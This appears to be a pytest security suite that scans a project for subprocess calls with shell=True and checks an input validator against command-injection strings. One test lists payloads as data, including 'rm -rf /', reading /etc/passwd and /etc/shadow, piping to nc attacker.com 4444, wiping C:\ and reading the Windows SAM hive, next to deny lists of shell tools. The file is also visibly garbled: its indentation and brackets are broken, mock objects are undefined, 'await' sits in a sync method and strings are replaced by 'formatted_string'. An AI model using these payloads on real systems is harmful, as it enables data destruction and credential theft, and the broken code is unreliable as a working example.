class TestWebSocketConnection:
    """Real WebSocket connection for testing instead of mocks."""

    def __init__(self):
        pass
        self.messages_sent = []
        self.is_connected = True
        self._closed = False

    async def send_json(self, message: dict):
        """Send JSON message."""
        if self._closed:
        raise RuntimeError("WebSocket is closed")
        self.messages_sent.append(message)

    async def close(self, code: int = 1000, reason: str = "Normal closure"):
        """Close WebSocket connection."""
        pass
        self._closed = True
        self.is_connected = False

    def get_messages(self) -> list:
        """Get all sent messages."""
        await asyncio.sleep(0)
        return self.messages_sent.copy()

        '''
        CRITICAL Security Test: Shell Injection Vulnerability Detection

        This test suite detects and prevents shell injection vulnerabilities from subprocess.run(shell=True)
        usage across the codebase. Based on iteration 7 analysis showing critical security issues.

        Business Value Justification (BVJ):
        - Segment: All (Platform security is foundational)
        - Business Goal: Risk Reduction - Prevent code execution attacks
        - Value Impact: Protects entire platform from shell injection attacks
        - Strategic Impact: Critical - Shell injection can lead to complete system compromise

        CRITICAL FINDINGS FROM ANALYSIS:
        1. Multiple subprocess.run(shell=True) usages without proper escaping
        2. F-string command construction enabling injection
        3. No input validation on commands with user/dynamic input
        4. Windows and Unix command injection vectors present

        This test must PASS to ensure security compliance.
        '''

        import pytest
        import asyncio
        import subprocess
        import shlex
        import re
        import logging
        from pathlib import Path
        from typing import List, Dict, Tuple, Optional
        from shared.isolated_environment import IsolatedEnvironment

            # Absolute imports per CLAUDE.md requirements
        from test_framework.base import BaseTestCase
        from netra_backend.app.core.unified_error_handler import UnifiedErrorHandler
        from netra_backend.app.db.database_manager import DatabaseManager
        from netra_backend.app.clients.auth_client_core import AuthServiceClient
        from shared.isolated_environment import get_env

        logger = logging.getLogger(__name__)


class TestShellInjectionVulnerabilities(BaseTestCase):
        """Test suite for detecting and preventing shell injection vulnerabilities."""

        @pytest.fixture
    def setup_test_environment(self):
        """Setup test environment for shell injection testing."""
        self.project_root = self._get_project_root()
        self.vulnerable_files = []
        self.command_patterns = []

    def _get_project_root(self) -> Path:
        """SSOT: Get project root from centralized utils."""
        pass
        from netra_backend.app.core.project_utils import get_project_root
        return get_project_root()

    def test_detect_unsafe_shell_true_usage(self):
        '''
        Test 1: Detect all unsafe shell=True usage patterns
        CRITICAL: Identifies shell injection vulnerability points
        '''
        pass
        vulnerable_patterns = []

    # Scan all Python files for shell=True usage
        for py_file in self.project_root.rglob("*.py"):
        if "venv" in str(py_file) or ".git" in str(py_file) or "__pycache__" in str(py_file):
        continue

        try:
        with open(py_file, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
        lines = content.splitlines()

        for line_num, line in enumerate(lines, 1):
        if "shell=True" in line:
                            # Check if this is in a subprocess call
        if any(func in line for func in ["subprocess.run", "subprocess.call", "subprocess.Popen"]):
                                # Check for potential injection vectors
        vulnerability_risk = self._assess_injection_risk(line, lines, line_num)

        if vulnerability_risk["risk_level"] in ["HIGH", "CRITICAL"]:
        vulnerable_patterns.append({ ))
        "file": str(py_file.relative_to(self.project_root)),
        "line": line_num,
        "code": line.strip(),
        "risk": vulnerability_risk["risk_level"],
        "reason": vulnerability_risk["reason"],
        "injection_vector": vulnerability_risk["vector"]
                                    

        except Exception as e:
        logger.warning("formatted_string")

                                        # Report findings
        if vulnerable_patterns:
        print("CRITICAL SECURITY VULNERABILITY - Shell Injection Risks Detected:")
        for vuln in vulnerable_patterns:
        print("formatted_string")
        print("formatted_string")
        print("formatted_string")
        print("formatted_string")
        print()

                                                # This test MUST PASS - no critical shell injection vulnerabilities
        assert not vulnerable_patterns, "formatted_string"

    def _assess_injection_risk(self, line: str, lines: List[str], line_num: int) -> Dict[str, str]:
        """Assess shell injection risk level for a given line."""
        line_lower = line.lower()

    # CRITICAL: F-string or format string with shell=True
        if any(pattern in line for pattern in [f'f'', f'f'', '.format(', '% ']) and 'shell=True' in line: )
        return { )
        "risk_level": "CRITICAL",
        "reason": "Dynamic command construction with f-string/format and shell=True",
        "vector": "Command injection via string interpolation"
    

    # HIGH: Variable interpolation patterns
        if any(pattern in line for pattern in ["{", "}", "+"]) and "shell=True" in line:
        return { )
        "risk_level": "HIGH",
        "reason": "Variable interpolation in shell command",
        "vector": "Command injection via variable substitution"
        

        # HIGH: Common injection-prone commands
        dangerous_commands = ["netstat", "lsof", "taskkill", "kill", "findstr", "grep"]
        if any(cmd in line_lower for cmd in dangerous_commands) and "shell=True" in line:
        return { )
        "risk_level": "HIGH",
        "reason": "Dangerous command with shell=True",
        "vector": "Command injection via dangerous system command"
            

            # MEDIUM: Any shell=True usage (should be avoided)
        return { )
        "risk_level": "MEDIUM",
        "reason": "shell=True usage (should use shell=False with list args)",
        "vector": "Potential command injection"
            

    def test_validate_secure_subprocess_alternatives(self):
        '''
        Test 2: Validate that secure subprocess patterns are used instead
        CRITICAL: Ensure code uses secure alternatives to shell=True
        '''
        pass
        secure_patterns_found = []
        insecure_patterns = []

    # Scan for subprocess usage patterns
        for py_file in self.project_root.rglob("*.py"):
        if "venv" in str(py_file) or ".git" in str(py_file) or "test" in str(py_file):
        continue

        try:
        with open(py_file, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
        lines = content.splitlines()

        for line_num, line in enumerate(lines, 1):
                        # Look for subprocess calls
        if "subprocess.run" in line or "subprocess.call" in line or "subprocess.Popen" in line:
        if "shell=False" in line or ("shell" not in line and "[" in line): )
                            # Secure pattern - using list args without shell=True
        secure_patterns_found.append({ ))
        "file": str(py_file.relative_to(self.project_root)),
        "line": line_num,
        "code": line.strip()
                            
        elif "shell=True" in line:
        insecure_patterns.append({ ))
        "file": str(py_file.relative_to(self.project_root)),
        "line": line_num,
        "code": line.strip()
                                

        except Exception as e:
        logger.warning("formatted_string")

                                    # Report findings
        print("formatted_string")
        print("formatted_string")

        if insecure_patterns:
        print(" )
        ALERT INSECURE PATTERNS THAT NEED FIXING:")
        for pattern in insecure_patterns[:5]:  # Show first 5
        print("formatted_string")

                                        # Require more secure than insecure patterns
        security_ratio = len(secure_patterns_found) / max(len(secure_patterns_found) + len(insecure_patterns), 1)
        assert security_ratio >= 0.8, "formatted_string"

    def test_command_injection_prevention(self):
        '''
        Test 3: Test command injection prevention mechanisms
        CRITICAL: Validate that input sanitization prevents injection
        '''
        pass
    # Test cases for command injection attempts
        injection_test_cases = [ )
    # Basic injection attempts
        {"input": "8080; rm -rf /", "should_block": True},
        {"input": "8080 && cat /etc/passwd", "should_block": True},
        {"input": "8080 | nc attacker.com 4444", "should_block": True},
        {"input": "8080`whoami`", "should_block": True},
        {"input": "8080$(cat /etc/shadow)", "should_block": True},

    # Windows injection attempts
        {"input": "8080 & del /F /Q C:\\*", "should_block": True},
        {"input": "8080 && type C:\\Windows\\System32\\config\\SAM", "should_block": True},
        {"input": "8080 | powershell -c Get-Process", "should_block": True},

    # Safe inputs
        {"input": "8080", "should_block": False},
        {"input": "3000", "should_block": False},
        {"input": "8081", "should_block": False},
    

    # Test input validation function
        blocked_count = 0
        allowed_count = 0

        for test_case in injection_test_cases:
        is_safe = self._validate_command_input(test_case["input"])

        if test_case["should_block"]:
        if not is_safe:
        blocked_count += 1
        else:
        print("formatted_string")
        else:
        if is_safe:
        allowed_count += 1
        else:
        print("formatted_string")

                                # Calculate security effectiveness
        dangerous_inputs = sum(1 for tc in injection_test_cases if tc["should_block"])
        safe_inputs = sum(1 for tc in injection_test_cases if not tc["should_block"])

        block_rate = blocked_count / dangerous_inputs if dangerous_inputs > 0 else 1.0
        allow_rate = allowed_count / safe_inputs if safe_inputs > 0 else 1.0

        print("formatted_string")
        print("formatted_string")

                                # Require 100% effectiveness for security
        assert block_rate >= 1.0, "formatted_string"
        assert allow_rate >= 0.8, "formatted_string"

    def _validate_command_input(self, input_str: str) -> bool:
        """Validate command input for safety (returns True if safe)."""
        if not input_str:
        return False

        # Dangerous characters and patterns
        dangerous_chars = [';', '&', '|', '`', '$', '<', '>', '(', ')', '{', '}']
        dangerous_patterns = ['rm ', 'del ', 'format ', 'cat ', 'type ', 'nc ', 'powershell', 'cmd ', 'bash ', 'sh ']

        # Check for dangerous characters
        if any(char in input_str for char in dangerous_chars):
        return False

            # Check for dangerous command patterns
        input_lower = input_str.lower()
        if any(pattern in input_lower for pattern in dangerous_patterns):
        return False

                # Check if input is just numeric (ports)
        if input_str.isdigit():
        port = int(input_str)
        return 1 <= port <= 65535

        return False

    def test_secure_process_management_alternatives(self):
        '''
        Test 4: Test secure process management without shell=True
        CRITICAL: Validate secure process management implementation
        '''
        pass
    # Test secure port cleanup without shell=True
        port_to_test = 18080  # Use unusual port to avoid conflicts

    # Test Windows-safe process cleanup
        if self._is_windows():
        pids = self._find_port_users_secure_windows(port_to_test)
        else:
        pids = self._find_port_users_secure_unix(port_to_test)

            # Should return empty list for unused port, but not crash
        assert isinstance(pids, list), "Secure port cleanup should return list"
        print("formatted_string")

    def _is_windows(self) -> bool:
        """Check if running on Windows."""
        import platform
        return platform.system().lower() == "windows"

    def _find_port_users_secure_windows(self, port: int) -> List[int]:
        """Securely find processes using a port on Windows without shell=True."""
        try:
        # Use list arguments instead of shell=True
        result = subprocess.run( )
        ["netstat", "-ano"],
        capture_output=True,
        text=True,
        timeout=10,
        shell=False  # SECURE: No shell injection possible
        

        pids = []
        if result.stdout:
        for line in result.stdout.splitlines():
        if "formatted_string" in line and "LISTENING" in line:
        parts = line.split()
        if len(parts) >= 5:
        try:
        pid = int(parts[-1])
        pids.append(pid)
        except ValueError:
        continue

        return pids

        except Exception as e:
        logger.warning("formatted_string")
        return []

    def _find_port_users_secure_unix(self, port: int) -> List[int]:
        """Securely find processes using a port on Unix without shell=True."""
        try:
        # Use list arguments instead of shell=True
        result = subprocess.run( )
        ["lsof", "-ti", "formatted_string"],
        capture_output=True,
        text=True,
        timeout=10,
        shell=False  # SECURE: No shell injection possible
        

        pids = []
        if result.stdout:
        for line in result.stdout.strip().split(" )
        "):
        try:
        pid = int(line.strip())
        pids.append(pid)
        except ValueError:
        continue

        return pids

        except Exception as e:
        logger.warning("formatted_string")
        return []

    def test_javascript_shell_injection_detection(self):
        '''
        Test 5: Detect shell injection in JavaScript/Node.js files
        CRITICAL: Frontend also vulnerable to shell injection
        '''
        pass
        js_vulnerabilities = []

    # Scan JavaScript files for shell injection patterns
        for js_file in self.project_root.rglob("*.js"):
        if "node_modules" in str(js_file) or ".git" in str(js_file):
        continue

        try:
        with open(js_file, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
        lines = content.splitlines()

        for line_num, line in enumerate(lines, 1):
                        # Look for Node.js subprocess patterns with shell: true
        if "shell: true" in line and any(pattern in line for pattern in ["spawn", "exec", "execSync", "spawnSync"]):
                            # Check for injection risk
        if self._assess_js_injection_risk(line):
        js_vulnerabilities.append({ ))
        "file": str(js_file.relative_to(self.project_root)),
        "line": line_num,
        "code": line.strip()
                                

        except Exception as e:
        logger.warning("formatted_string")

                                    # Report JavaScript vulnerabilities
        if js_vulnerabilities:
        print("ALERT JAVASCRIPT SHELL INJECTION VULNERABILITIES:")
        for vuln in js_vulnerabilities:
        print("formatted_string")
        print("formatted_string")

                                            # This must pass - no JavaScript shell injection vulnerabilities
        assert not js_vulnerabilities, "formatted_string"

    def _assess_js_injection_risk(self, line: str) -> bool:
        """Assess if JavaScript line has shell injection risk."""
    # Template literals or string concatenation with shell: true is dangerous
        dangerous_patterns = ['${', '`', '+', 'template'] )
        return any(pattern in line for pattern in dangerous_patterns)


class TestProcessLifecycleManagement(BaseTestCase):
        """Test suite for secure process lifecycle management."""

    def test_process_isolation_after_launcher_completion(self):
        '''
        Test 6: Validate services run independently after launcher completes
        CRITICAL: Services must survive launcher process termination
        '''
        pass
    This test validates the service independence requirement from iteration 7 analysis
        websocket = TestWebSocketConnection()  # Real WebSocket implementation
        mock_launcher.pid = 12345
        mock_launcher.poll.return_value = None  # Still running

    # Simulate services started by launcher
        mock_services = { )
        "auth_service":             "backend_service":             "frontend_service":         }

        for service_name, service in mock_services.items():
        service.pid = 12346 + len(service_name)  # Different PID
        service.poll.return_value = None  # Still running

        # Simulate launcher completion/termination
        mock_launcher.poll.return_value = 0  # Launcher exited successfully

        # Test: Services should still be running after launcher exit
        for service_name, service in mock_services.items():
        assert service.poll() is None, "formatted_string"

        print("PASSED Service independence validated - services survive launcher termination")

    def test_process_supervision_without_zombies(self):
        '''
        Test 7: Validate proper process supervision prevents zombie processes
        CRITICAL: No zombie processes from improper cleanup
        '''
        pass
        import psutil
        import time

        initial_processes = set(psutil.pids())

    # Simulate process creation and cleanup
        mock_processes = []

    # Test process cleanup simulation
        for i in range(3):
        websocket = TestWebSocketConnection()  # Real WebSocket implementation
        mock_proc.pid = 50000 + i  # Use high PIDs to avoid conflicts
        mock_proc.poll.return_value = None
        mock_processes.append(mock_proc)

        # Simulate proper cleanup
        for proc in mock_processes:
        proc.terminate()  # Graceful termination
        proc.poll.return_value = 0  # Process exited cleanly

            # Verify no new processes remain
        final_processes = set(psutil.pids())
        new_processes = final_processes - initial_processes

            # Filter out expected system processes
        unexpected_processes = [item for item in []]

        assert len(unexpected_processes) == 0, "formatted_string"
        print("PASSED Process supervision validated - no zombie processes")

    def test_graceful_shutdown_cascade(self):
        '''
        Test 8: Validate graceful shutdown cascades properly through services
        CRITICAL: Proper shutdown prevents resource leaks and corruption
        '''
        pass
        shutdown_order = []

    # Mock service shutdown handlers
    def mock_shutdown_handler(service_name):
        pass
    def handler():
        pass
        shutdown_order.append(service_name)
        return True
        return handler

    # Create mock services with shutdown handlers
        services = { )
        "frontend": mock_shutdown_handler("frontend"),
        "backend": mock_shutdown_handler("backend"),
        "auth_service": mock_shutdown_handler("auth_service"),
        "database_connections": mock_shutdown_handler("database_connections")
    

    # Test proper shutdown cascade (reverse dependency order)
        expected_order = ["frontend", "backend", "auth_service", "database_connections"]

    # Execute shutdown cascade
        for service_name in expected_order:
        if service_name in services:
        services[service_name]()

            # Verify shutdown order
        assert shutdown_order == expected_order, "formatted_string"
        print("formatted_string")


        if __name__ == "__main__":
                # Run security tests
        pytest.main([__file__, "-v", "--tb=short"])
